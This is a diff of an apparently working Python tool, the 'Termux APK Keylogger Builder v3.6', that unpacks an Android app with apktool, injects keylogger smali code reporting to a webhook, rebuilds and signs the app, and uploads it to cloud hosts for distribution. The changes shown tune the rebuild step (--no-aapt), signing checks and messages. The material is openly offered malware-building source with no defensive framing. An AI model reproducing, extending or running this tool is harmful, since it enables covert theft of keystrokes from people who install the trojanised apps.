@@ -2,9 +2,11 @@
 """
 ============================================================
   TERMUX APK KEYLOGGER BUILDER v3.6 (FINAL)
-  - APK saved to /sdcard/Download/ for easy access
+  - Uses apktool with --no-aapt (no resources recompiled)
+  - Preserves original APK size and all native libs
+  - APK saved to /sdcard/Download/
   - Multiple cloud upload fallbacks
-  - No aapt required
+  - Developer: GT Security Team
 ============================================================
 """
 
@@ -13,7 +15,6 @@ import sys
 import subprocess
 import shutil
 import uuid
-import json
 import time
 import requests
 from datetime import datetime
@@ -40,11 +41,17 @@ def check_dependencies():
         'apktool': 'pkg install apktool -y',
         'java': 'pkg install openjdk-17 -y',
         'zipalign': 'pkg install zipalign -y',
+        'jarsigner': 'pkg install openjdk-17 -y',  # jarsigner comes with Java
     }
     missing = []
     for tool, install_cmd in tools.items():
-        if shutil.which(tool) is None:
-            missing.append((tool, install_cmd))
+        if tool == 'jarsigner':
+            # jarsigner is in the same bin as java, check with 'which jarsigner'
+            if shutil.which('jarsigner') is None and shutil.which('keytool') is None:
+                missing.append((tool, install_cmd))
+        else:
+            if shutil.which(tool) is None:
+                missing.append((tool, install_cmd))
     if missing:
         print_c("\n[!] Missing tools:", Colors.RED)
         for tool, cmd in missing:
@@ -257,7 +264,7 @@ def generate_smali(webhook, features, interval):
 '''
     return outer, inner
 
-# ---------------------------- UPLOAD TO CLOUD (MULTIPLE FALLBACKS) ----------------------------
+# ---------------------------- UPLOAD TO CLOUD (MULTIPLE) ----------------------------
 def upload_to_cloud(filepath):
     print_c("[*] Uploading to cloud...", Colors.YELLOW)
     services = [
@@ -280,7 +287,7 @@ def upload_to_cloud(filepath):
             continue
     return None
 
-# ---------------------------- INJECTION ENGINE ----------------------------
+# ---------------------------- INJECTION ENGINE (WITH --no-aapt) ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
@@ -331,17 +338,17 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(manifest)
 
-        # Rebuild
-        print_c("[*] Rebuilding APK...", Colors.YELLOW)
+        # ---------- REBUILD WITH --no-aapt (no resource compilation) ----------
+        print_c("[*] Rebuilding APK (--no-aapt)...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
-        build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned]
+        build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned, "--no-aapt"]
 
         result = subprocess.run(build_cmd, capture_output=True, text=True)
         if result.returncode != 0:
             print_c("[!] Build failed:", Colors.RED)
             print_c(result.stderr, Colors.RED)
             shutil.rmtree(work_dir, ignore_errors=True)
-            raise Exception("APK rebuild failed.")
+            raise Exception("APK rebuild failed. Check if apktool works.")
 
         # Sign
         print_c("[*] Signing APK...", Colors.YELLOW)
@@ -413,7 +420,7 @@ def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
     ║   APK KEYLOGGER BUILDER v3.6             ║
-    ║   APK saved to /sdcard/Download/         ║
+    ║   No aapt – preserves all resources      ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -475,7 +482,7 @@ def inject_flow():
         elapsed = time.time() - start
         print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)
 
-        # ---------- COPY TO /sdcard/Download/ FOR EASY ACCESS ----------
+        # Copy to /sdcard/Download/
         sdcard_download = "/sdcard/Download"
         if os.path.exists(sdcard_download):
             sdcard_apk = os.path.join(sdcard_download, os.path.basename(output_apk))
@@ -486,7 +493,7 @@ def inject_flow():
             print_c("\n[!] /sdcard/Download not found. APK is saved in:", Colors.YELLOW)
             print_c(f"   {output_apk}", Colors.YELLOW)
 
-        # Try to upload to cloud
+        # Upload to cloud
         link = upload_to_cloud(output_apk)
         if link:
             print_c("\n✅ DOWNLOAD LINK:", Colors.GREEN)
